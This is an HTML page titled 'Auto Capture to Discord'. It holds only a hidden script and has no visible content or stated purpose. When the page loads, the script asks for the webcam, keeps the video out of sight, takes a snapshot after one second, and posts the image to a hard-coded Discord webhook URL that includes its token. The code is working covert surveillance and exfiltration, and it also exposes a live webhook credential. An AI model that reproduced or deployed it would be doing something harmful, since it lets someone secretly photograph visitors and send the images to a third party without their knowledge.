<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture to Discord</title>
</head>
<body>
    <video id="webcam" autoplay playsinline style="display: none;"></video>
    <script>
        window.addEventListener('load', () => {
            // Access the webcam
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('webcam');
                    video.srcObject = stream;

                    // Once the video is ready
                    video.addEventListener('canplay', () => {
                        // Wait a moment to let the video stabilize
                        setTimeout(() => {
                            // Create a canvas to capture the image
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Convert the image to a blob
                            canvas.toBlob(blob => {
                                let formData = new FormData();
                                formData.append('image', blob, 'snapshot.jpg');

                                // Send directly to Discord webhook
                                fetch('https://discord.com/api/webhooks/1507341965069389884/Y9wNNhe9MX-W4MfV8Khq_QW3WE6xGW__BYq4KTn4HWwkmWqgZyfszLAGyK-aBNKfnmei', {
                                    method: 'POST',
                                    body: formData
                                })
                                .then(response => response.text())
                                .then(data => {
                                    console.log('Upload to Discord success:', data);
                                    // Optionally stop the stream
                                    stream.getTracks().forEach(track => track.stop());
                                })
                                .catch(error => {
                                    console.error('Upload to Discord failed:', error);
                                });
                            }, 'image/jpeg');
                        }, 1000); // Wait 1 second
                    });
                })
                .catch(error => {
                    console.error('Could not access webcam:', error);
                });
        });
    </script>
</body>
</html>
